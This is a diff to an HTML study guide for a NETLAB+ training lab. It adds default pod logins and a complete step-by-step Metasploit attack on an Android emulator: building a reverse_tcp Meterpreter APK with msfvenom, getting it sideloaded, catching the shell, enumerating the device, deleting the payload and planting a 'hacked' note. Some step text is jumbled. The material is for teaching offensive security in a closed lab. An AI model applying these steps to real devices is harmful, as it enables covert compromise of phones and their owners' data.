@@ -191,6 +191,40 @@
   .evidence li input{width:20px;height:20px;margin-top:.12rem;accent-color:var(--violet);flex:none}
   .evidence .shot{font-weight:600;color:var(--ink)}
   @media print{.evidence li input{-webkit-appearance:checkbox;appearance:checkbox}}
+
+#fullsteps .step h3.fh{font-weight:600;font-size:.95rem;line-height:1.5;margin:0;display:block}
+#fullsteps .step h3.fh .n{margin-right:.5rem}
+#fullsteps .shotmark{margin:.55rem 0 0;padding:.5rem .7rem;border-left:3px solid var(--accent);background:var(--surface-2);border-radius:6px;font-size:.88rem;color:var(--ink)}
+#fullsteps .shotmark b{color:var(--accent)}
+
+.pm-toggle.ctl{cursor:pointer}
+html[data-present="on"] nav.toc,
+html[data-present="on"] .hero .lede,
+html[data-present="on"] .hero .chips,
+html[data-present="on"] footer.site,
+html[data-present="on"] .done-row{display:none!important}
+html[data-present="on"] #main{max-width:100%}
+html[data-present="on"] .hero{margin-top:.6rem}
+html[data-present="on"] .hero h1{font-size:1.25rem;margin-top:.2rem}
+html[data-present="on"] #main > section{display:none;margin-top:1rem}
+html[data-present="on"] #main > section.pm-current{display:block;animation:pm-fade .18s ease;font-size:1.04rem}
+@keyframes pm-fade{from{opacity:0}to{opacity:1}}
+html[data-present="on"] .call.auth{display:none!important}
+html[data-present="on"][data-pm-index="0"] .call.auth{display:block!important}
+.pm-dock{display:none}
+html[data-present="on"] .pm-dock{position:fixed;left:0;right:0;bottom:0;z-index:2147483100;display:flex;
+  align-items:center;gap:8px;padding:8px 12px;background:var(--surface);border-top:1px solid var(--border);
+  padding-bottom:calc(8px + env(safe-area-inset-bottom,0px))}
+.pm-dock button{flex:0 0 auto;min-height:40px;min-width:44px;padding:0 14px;cursor:pointer;background:var(--surface-2);
+  color:var(--ink);border:1px solid var(--border);border-radius:8px;font:inherit;font-size:.85rem}
+.pm-dock button:hover{background:var(--accent);color:var(--accent-ink,#06240f)}
+.pm-dock button:disabled{opacity:.4;cursor:not-allowed}
+.pm-dock button:disabled:hover{background:var(--surface-2);color:var(--ink)}
+.pm-dock .pm-where{flex:1 1 auto;text-align:center;min-width:0;font-size:.78rem;color:var(--muted)}
+.pm-dock .pm-where b{color:var(--ink);display:block;font-size:.9rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+@media print{.pm-dock,.pm-toggle{display:none!important}}
+html[data-present="on"] #ca-launch{display:none!important}
+
 </style>
 </head>
 <body>
@@ -206,6 +240,7 @@
       </div>
       <button class="ctl" id="theme-toggle" aria-pressed="false">🌙 Dark</button>
       <button class="ctl" id="print-btn">🖨 Print</button>
+          <button class="ctl pm-toggle" id="pmToggle" type="button">⇤ Lab mode</button>
       <button class="ctl" id="clear-btn">Clear progress</button>
     </div>
   </div>
@@ -238,6 +273,7 @@
       <li><a href="#overview">Overview</a></li>
       <li><a href="#environment">The environment</a></li>
       <li><a href="#walkthrough">The attack chain, explained</a></li>
+      <li><a href="#fullsteps">Full lab steps</a></li>
       <li><a href="#reference">Reference</a></li>
       <li><a href="#stuck">Where people get stuck</a></li>
       <li><a href="#defend">The defender's view</a></li>
@@ -259,6 +295,7 @@
   <section id="environment" data-track>
     <h2>The environment you're working in</h2>
     <p>You run <strong>Metasploit</strong> on <strong>Kali</strong> and target an <strong>Android VM/emulator</strong> in the pod. The app is delivered and installed manually onto the test device — standing in for the social-engineering step that would trick a real user into sideloading it.</p>
+    <div class="tbl-wrap"><table id="cred-table"><thead><tr><th>Machine</th><th>Address</th><th>Sign-in (user / pass)</th></tr></thead><tbody><tr><td><b>Kali Linux</b></td><td><code>192.168.9.2 / 192.168.0.2</code></td><td><code>root</code> / <code>toor</code></td></tr><tr><td><b>WinOS</b></td><td><code>192.168.0.20</code></td><td><code>Administrator</code> / <code>Train1ng$</code></td></tr><tr><td><b>Android Pie</b></td><td><code>192.168.0.5</code></td><td><span style="color:var(--muted)">no login</span></td></tr><tr><td><b>pfSense</b></td><td><code>192.168.0.254 / 192.168.68.254</code></td><td><code>admin</code> / <code>pfsense</code></td></tr></tbody></table></div><p class="muted" style="font-size:.84rem;color:var(--muted)">Fixed NETLAB+ pod logins for this lab (case-sensitive); the same every time the pod resets.</p>
     <div class="done-row"><input type="checkbox" id="done-environment" data-done="environment"><label for="done-environment">Mark this section reviewed</label></div>
   </section>
 
@@ -296,6 +333,76 @@
     </div>
     <div class="done-row"><input type="checkbox" id="done-walkthrough" data-done="walkthrough"><label for="done-walkthrough">Mark this section reviewed</label></div>
   </section>
+
+<section id="fullsteps" data-track>
+<h2>Full lab steps</h2>
+<p>Every step from the NDG lab guide, in order — enough to run the lab end to end from this page. The command walkthrough above explains the key commands and the <em>why</em>; this is the complete click-by-click checklist. Watch for the 📸 markers — those are the moments worth a screenshot.</p>
+<p class="task-head">Task 1 - Configure Android VM</p>
+<div class="step"><h3 class="fh"><span class="n">1</span> Launch the WinOS virtual machine to access the graphical login screen. 1.1. Select Send CTRL+ALT+DEL from the dropdown menu to be prompted with the login screen. 1.2. Log in as Administrator using the password: Train1ng$</h3></div>
+<div class="step"><h3 class="fh"><span class="n">2</span> Let us begin by opening the Microsoft hypervisor software called Hyper-V by clicking the Start Menu button seen in item 1. Next, search for the Microsoft hypervisor by typing Hyper as seen in item 2. Then, click Hyper-V Manager to start the Desktop application, as seen in item 3 below. Alternatively, you can start the application by double-clicking the shortcut on the Desktop, as seen in item 4, or from the toolbar as seen in item 5.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">3</span> The Hyper-V Manager window will appear. This desktop application has many uses, but for now, let us focus on starting the Android Virtual Machine (VM) to begin this lab. Proceed by selecting the WINOS option as seen in item 1 below. Next, select the Android Pie VM that appears under the Virtual Machines tab, as seen in item 2. Finally, select Connect, found at the bottom-right corner of the window, in the right pane called Actions, as seen in item 3 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">4</span> The Virtual Machine Connection window will appear. For this exercise, a device was configured using the Android Pie system image running the operating system Android 9.0. Launch the Android emulator from within the Virtual Machine Connection window by clicking Start as seen in item 1 below. Only select Start from the Action menu. Under no circumstance should you attempt to modify the Android Virtual Machine's device configuration settings.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">5</span> Next, we will adjust the size of the emulator. This will widen the display and allow us to view the device's content clearly. Click View from the Menu bar and then select Full Screen Mode as seen in items 1 and 2 below. Alternatively, you can select the maximize icon, as seen in item 3 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">6</span> Now that the display is wider let us check the VM's IP address. To begin, click the Application menu button on the Home screen to launch the Android menu, as seen in item 1. Then, select the Settings icon to launch the Android Settings application, as seen in item 2. Next, click the Network &amp; Internet menu option, seen in item 3, to view the network settings. In the Network &amp; Internet window, click the Wi-Fi option seen in item 4 to view the Wi-Fi settings for this device.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">7</span> You will be taken to the Wi-Fi window. This window shows the SSID of the connected Wi-Fi network and will also list the available Wi-Fi networks. Select the SSID VirtWifi, then Advanced to view details about the currently connected Wi-Fi network as seen in items 1 and 2. Take note of the IP address, seen in item 3 below, and the other details here as well since you will need to know them to exploit the device.</h3></div>
+<p class="task-head">Task 2 - Metasploit Payload to Hack Android</p>
+<div class="step"><h3 class="fh"><span class="n">1</span> Now that we have the network details, let us launch the Kali Linux virtual machine, as highlighted below, to begin the attack. 1.1 Log in as root using the password: toor</h3></div>
+<div class="step"><h3 class="fh"><span class="n">2</span> Before starting the lab, we need to ensure that the host machine is on the same network as the target machine. Select the Ethernet network connection from the navigation panel, as seen in item 1. Next, click Wired connection eth1 as seen in item 2 to allow Kali Linux to use the network adapter with the IP address 192.168.0.2. The target machine is on the network 192.168.0.0/24. The Kali Linux</h3><div class="call tip"><span class="k">Note</span><p>VM is configured with both IP address and can be easily interchanged.</p></div></div>
+<div class="step"><h3 class="fh"><span class="n">3</span> Now that you know the IP address of the target device, and the Kali Linux host is connected to the same network as the target device, we can move on to creating the payload that will be used to compromise the Android VM. We will need to run the Metasploit Framework exploitation tool to perform the attack. To begin, launch the terminal by clicking the Terminal icon as seen in item 1 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">4</span> The Terminal window will appear. Let us confirm that the services we need for this lab are currently running. To do this, type the command systemctl status apache2 and press Enter as seen in item 1. Look for the status identifier Active, as seen in item 2 below. root@kali:~# systemctl status apache2</h3></div>
+<div class="step"><h3 class="fh"><span class="n">5</span> Let us start the Apache2 service and confirm that it is running before we proceed. Type the command systemctl start apache2 and press Enter as seen in item 1. Next, type systemctl status apache2 and press Enter as seen in item 2. Observe that the Active tag now shows that the service is running, as seen in item 3 below. root@kali:~# systemctl start apache2 root@kali:~# systemctl status apache2</h3><div class="call tip"><span class="k">Note</span><p>To exit the system control status check, press Ctrl+C to exit.</p></div></div>
+<div class="step"><h3 class="fh"><span class="n">6</span> By default, Apache server will not allow access to the resources located at /var/www/html. Since this will be the destination of the created payload, let us remove the default index.html file. Type the command rm /var/www/html/index.html and press Enter as seen in item 1 below. This will delete the index.html file from the path. If the index.html file is not removed, the Apache web server will display this web pages and you will be unable to get access to the file need to exploit the Android emulator.</h3><div class="cmd"><pre>root@kali:~# rm /var/www/html/index.html</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">7</span> We will now be creating a payload to exploit the Android emulator in the WinOS machine, but first, let us create a directory to store the file. Since we are using the Apache web server, we will create a folder in the location /var/www/html. To do this, type the command mkdir /var/www/html/lab25 and press Enter to create the directory named lab25, as seen in item 1 below.</h3><div class="cmd"><pre>root@kali:~# mkdir /var/www/html/lab25</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">8</span> Now, type the command msfvenom -help and press Enter as seen in item 1 below. This will generate the use cases of the tool and the options it can include. Item 2 displays an example of how the command is written. Let us make our own payload for the android device we started earlier. root@kali:~# msfvenom -help</h3></div>
+<div class="shotmark">📸 <b>Screenshot for your report:</b> <span class="shot">APK built.</span> The msfvenom output producing the Android payload.</div><div class="step"><h3 class="fh"><span class="n">9</span> Type the command msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=4444 R &gt; /var/www/html/lab25/android.apk and press Enter. 192.168.0.2 is the IP address of the Kali Linux machine which we confirmed at step 2 above.</h3><div class="cmd"><pre>root@kali:~# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.2
+LPORT=4444 R &gt; /var/www/html/lab25/android.apk</pre></div></div>
+<p class="task-head">Task 3 - Access and Install Malicious APK File</p>
+<div class="step"><h3 class="fh"><span class="n">1</span> Now that we have created the Android APK file and saved it in the Apache server. Let us go back to the Android VM and download the file.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">2</span> To begin, click the Application menu button on the Home screen to launch the Android menu, as seen in item 1. Then, select the Chrome icon to launch the Chrome browser application, as seen in item 2.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">3</span> You should now have the Chrome browser open. Type the IP address 192.168.0.2 for the Linux machine in the search bar, and press Enter as seen in item 1 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">4</span> The Index of / window will appear; click the folder lab25 to access the Android APK as seen in item 1 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">5</span> You should now be in the Index of /lab25. Click android.apk; this will download the application package, as seen in item 1 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">6</span> Chrome will prompt to gain access to the storage on the device. Click Continue as seen in item 1 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">7</span> Then click Allow to grant Chrome access to files on the device, as seen in item 1 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">8</span> Ignore all warnings, then click OK to continue and begin downloading the application package, as seen in item 1 below. It is normal for a browser or the device itself to warn the user that the file or application being downloaded can harm the device. Generally, a user may cancel at this point, however, we will proceed.</h3></div>
+<div class="shotmark">📸 <b>Screenshot for your report:</b> <span class="shot">Device info.</span> <code class="inl">sysinfo</code>/<code class="inl">check_root</code> output for the test device.</div><div class="step"><h3 class="fh"><span class="n">9</span> The application package should now be downloaded to the device. Click Open to begin installing, as seen in item 1 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">10</span> The Android security will not allow the installation of applications from unknown sources. We will need to change the security setting to allow the installation of these types of apps. To do this, click the Settings option from the prompt that appears, as seen in item 1 below. In some cases, the user of the device may already have this setting enabled which would have been awesome and allow use to process staring to the installation windows of the application.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">11</span> The Install unknown apps window will appear. Click the Allow from this source option to enable it, allowing apps downloaded by Google Chrome to be installed on the device.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">12</span> To continue the installation process, click the Back button at the System navigation area at the bottom of the window, as seen in item 1.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">13</span> You will be brought to the installation window, where you will see all the features the application will have access to, as seen in item 1. As you can see from the details, our application is able to access lots of different features on the phone. Once you are done reviewing them, click the Install option as seen in item 2.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">14</span> Once the installation is done, you will see the App installed message; you can click Open to end the installation process and start the application.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">15</span> Now that the application was successfully installed on our target device, let us switch back to the Kali VM, as seen below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">16</span> The Terminal window should still be open in the Kali VM. Let us continue by typing the command sudo msfconsole and press Enter as seen in item 1. root@kali:~# sudo msfconsole</h3></div>
+<div class="step"><h3 class="fh"><span class="n">17</span> Now, type the command use exploit/multi/handler and press Enter as seen in item 1 below. msf5 &gt; use exploit/multi/handler</h3></div>
+<div class="step"><h3 class="fh"><span class="n">18</span> Within the Metasploit Framework, there are several payloads and exploits for different operating systems, but the ones we are interested in are for Android. The easiest way is to use the search command to locate exploits with the android tag. Let us type the command search android and press Enter as seen in item 1 below.</h3><div class="cmd"><pre>msf5 exploit(multi/handler) &gt; search android</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">19</span> As you can see, a list of available payloads is displayed within the terminal window. For this exercise, we will choose the payload payload/android/meterpreter/reverse_tcp. If you are unable to see the full list, scroll down to No 25. Type the command set payload android/meterpreter/reverse_tcp and press Enter as seen in item 1. msf5 exploit(multi/handler) &gt; set payload android/meterpreter/reverse_tcp</h3></div>
+<div class="step"><h3 class="fh"><span class="n">20</span> Now, let us look at the parameters this payload requires. Type the command show options and press Enter as seen in item 1 below. Here you will notice that it requires a local host (LHOST), as seen in item 2, which is the IP address of the Kali Linux VM and a local port (LPORT). The port number is not as important as the host IP address, so for now, we can leave it as the default, as seen in item 3 below. msf5 exploit(multi/handler) &gt; show options</h3></div>
+<div class="step"><h3 class="fh"><span class="n">21</span> Let us set the LHOST by typing the command set LHOST 192.168.0.2 and press Enter as seen in item 1 below. Then, type the command show options and press Enter to confirm the localhost IP address was added successfully, as seen in items 2 and 3 below. msf5 exploit(multi/handler) &gt; set LHOST 192.168.0.2 msf5 exploit(multi/handler) &gt; show options 192.168.0.2 is the IP address of the Kali Linux machine.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">22</span> Now, let us exploit the device. Type the command exploit -j -z and press Enter as seen in item 1 below. msf5 exploit(multi/handler) &gt; exploit -j -z -j and -z are option tags that tell the exploit to run the job and do not interact with the session, respectively, after the connection is made. Be careful when typing the command. If you type an incorrect command and the terminal hangs. Use Ctrl+C to cancel the command. Do not use the Ctrl+Z keys. This will close msfconsole and you will be forces to start from step 18.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">23</span> This should create a session between the two devices. Let us interact with the session and see what happens. Type the command sessions -i 1 and press Enter as seen in item 1 below. msf5 exploit(multi/handler) &gt; sessions -i 1 -i means interact with the supplied session ID; in this instance it is 1.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">24</span> This should launch the Meterpreter shell. This means that we have successfully accessed and exploited the Android emulator, but we will not stop here. A good hacker tries to learn as much they can about the target as possible, for example, the victim's network interfaces, system information, etc. This is the process of enumeration.</h3></div>
+<div class="shotmark">📸 <b>Screenshot for your report:</b> <span class="shot">Session opened.</span> The handler reporting an Android Meterpreter session.</div><div class="step"><h3 class="fh"><span class="n">25</span> Type the command sysinfo and press Enter as seen in item 1 below.</h3><div class="cmd"><pre>meterpreter &gt; sysinfo</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">26</span> Type the command ifconfig and press Enter as seen in item 1 below. As you can see, the currently connected interface is called wlan0, and it has the IP address 192.168.0.5, which we know to be the IP address of our target device.</h3><div class="cmd"><pre>meterpreter &gt; ifconfig</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">27</span> Another useful command to run is the app list. To do this, type the command app_list as seen in item 1 below. The list of apps will appear, as seen in item 2 below.</h3><div class="cmd"><pre>meterpreter &gt; app_list</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">28</span> To check if the device is rooted, type check_root as seen in item 1 below.</h3><div class="cmd"><pre>meterpreter &gt; check_root</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">29</span> So far, we know the system information, root status, application list, network interfaces, and subnet. Let us dig deeper to unearth more useful information. Type the command cd / and press Enter as seen in item 1 below. The Meterpreter shell will not display your current path as you traverse the file system, however, you can use the command pwd and it will display where you are. Do this anytime you want to refresh your memory.</h3><div class="cmd"><pre>meterpreter &gt; cd /</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">30</span> Let us upload a file as proof that we accessed and exploited the device. We will begin by creating a text file to upload. Right-click anywhere on the Desktop to open the context menu. Navigate to Create Document and select Empty File as seen in items 1 and 2 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">31</span> Next, name the file README.txt and click Create as seen in items 1 and 2 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">32</span> Then, double-click the file README.txt to open it in the mousepad and write the phrase YOU HAVE BEEN HACKED!! as seen in item 1 below, or use a phrase of your choice.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">33</span> Click File from the navigation menu and select Save. Then, click File again and select Close Window to exit the mousepad, as seen in items 1, 2, 3, and 4 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">34</span> You should still be in the root of the device. Type ls and press Enter to list all files and directories in the current directory, as seen in item 1 below.</h3><div class="cmd"><pre>meterpreter &gt; ls</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">35</span> If you scroll through the list, you will see the system folder called sdcard. This folder stores files for Android devices and is a great place to find user files. Let us try to identify the file we downloaded while using the target device. To do this, type cd /sdcard/Download as seen in item 1. Once there, type ls as seen in item 2 to list the content of this folder. As you can see in item 3, the file we downloaded called android.apk is listed there.</h3><div class="cmd"><pre>meterpreter &gt; cd /sdcard/download
+meterpreter &gt; ls</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">36</span> Now, let us delete the android.apk file that we initially downloaded to exploit the device. As hackers, it is best practice to cover your tracks during and after the and 2 below. Item 3 confirms that the file was removed.</h3><div class="cmd"><pre>exploit. Type the commands rm android.apk and ls, respectively, as seen in items 1
+meterpreter &gt; rm android.apk</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">37</span> Now let us leave a note for the victim. Type the command upload -r /root/Desktop/README.txt /storage/emulated/0/Android/data and press Enter as seen in item 1 below.</h3><div class="cmd"><pre>meterpreter &gt; upload -r /root/Desktop/README.txt
+/storage/emulated/0/Android/data</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">38</span> Switch back to the Android Emulator to confirm that the text file was added. Click the Application menu button on the Home screen to launch the Android menu, as seen in item 1. Then, select the Files icon to launch the Android File manager, as seen in item 2.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">39</span> Select the more options icon located at the top-right corner, as seen in item 1. Then click Show internal storage as seen in item 2 below. This will allow you to navigate to the destination of the text file we uploaded to the device.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">40</span> Select Virtual Machine and navigate to the path Android &gt; data as seen in items 1 and 2. There you should see the README.txt file, as seen in item 3 below. Feel free to open the text and view the message. If prompted to select a file viewer, choose any to proceed.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">41</span> You have successfully completed this lab. Close all windows and terminals to end the lab.</h3></div>
+<div class="done-row"><input type="checkbox" id="done-fullsteps" data-done="fullsteps"><label for="done-fullsteps">Mark this section reviewed</label></div>
+</section>
 
   <section id="reference" data-track>
     <h2>Reference — beyond the lab</h2>
@@ -500,5 +607,53 @@
 })();
 </script>
 <script src="assistant.js" defer></script>
+
+<script>
+(function(){
+  "use strict";
+  var root=document.documentElement,slides=[],idx=0,toggle,dock,prevBtn,nextBtn,countEl,nameEl;
+  function labelFor(s){var h=s.querySelector("h2");return h?h.textContent.trim():s.id;}
+  function show(i){
+    idx=Math.max(0,Math.min(slides.length-1,i));
+    slides.forEach(function(s,n){s.classList.toggle("pm-current",n===idx);});
+    root.setAttribute("data-pm-index",String(idx));
+    if(countEl)countEl.textContent=(idx+1)+" / "+slides.length;
+    if(nameEl)nameEl.textContent=labelFor(slides[idx]);
+    if(prevBtn)prevBtn.disabled=idx===0;
+    if(nextBtn)nextBtn.disabled=idx===slides.length-1;
+    window.scrollTo(0,0);
+  }
+  function enter(){
+    slides=Array.prototype.slice.call(document.querySelectorAll("#main > section"));
+    if(!slides.length)return;
+    root.setAttribute("data-present","on");
+    if(dock)dock.setAttribute("aria-hidden","false");
+    if(toggle)toggle.textContent="\u21E4 Exit lab mode";
+    show(0);
+  }
+  function exit(){
+    root.removeAttribute("data-present");root.removeAttribute("data-pm-index");
+    slides.forEach(function(s){s.classList.remove("pm-current");});
+    if(dock)dock.setAttribute("aria-hidden","true");
+    if(toggle)toggle.textContent="\u21E4 Lab mode";
+  }
+  toggle=document.getElementById("pmToggle");
+  if(toggle)toggle.addEventListener("click",function(){root.getAttribute("data-present")==="on"?exit():enter();});
+  dock=document.createElement("div");dock.className="pm-dock";dock.id="pmDock";dock.setAttribute("aria-hidden","true");
+  dock.innerHTML='<button type="button" data-pm="prev">\u25C0 Prev</button>'+
+    '<div class="pm-where"><span id="pmCount"></span><b id="pmName"></b></div>'+
+    '<button type="button" data-pm="next">Next \u25B6</button>'+
+    '<button type="button" data-pm="exit" aria-label="Exit lab mode">\u2715</button>';
+  document.body.appendChild(dock);
+  prevBtn=dock.querySelector('[data-pm="prev"]');nextBtn=dock.querySelector('[data-pm="next"]');
+  countEl=dock.querySelector("#pmCount");nameEl=dock.querySelector("#pmName");
+  dock.addEventListener("click",function(e){var t=e.target.closest("[data-pm]");if(!t)return;
+    var a=t.getAttribute("data-pm");if(a==="prev")show(idx-1);else if(a==="next")show(idx+1);else exit();});
+  document.addEventListener("keydown",function(e){if(root.getAttribute("data-present")!=="on")return;
+    if(e.key==="ArrowRight"||e.key==="PageDown"){show(idx+1);e.preventDefault();}
+    else if(e.key==="ArrowLeft"||e.key==="PageUp"){show(idx-1);e.preventDefault();}
+    else if(e.key==="Escape"){exit();}});
+})();
+</script>
 </body>
 </html>
